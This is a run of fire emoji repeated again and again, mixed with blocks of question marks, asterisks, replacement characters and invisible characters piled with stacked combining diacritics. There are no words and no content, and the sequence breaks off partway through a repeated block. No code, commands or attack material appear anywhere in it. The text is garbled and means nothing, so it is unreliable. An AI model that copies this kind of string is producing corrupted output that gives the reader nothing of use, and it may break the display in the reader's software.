🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̈́̾🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̈́̾🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̈́̾🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̈́̾🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̈́̾🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̛̏͆͆̀̀̅͒́̋́͋͐͊͌̕͝͡͝͝͝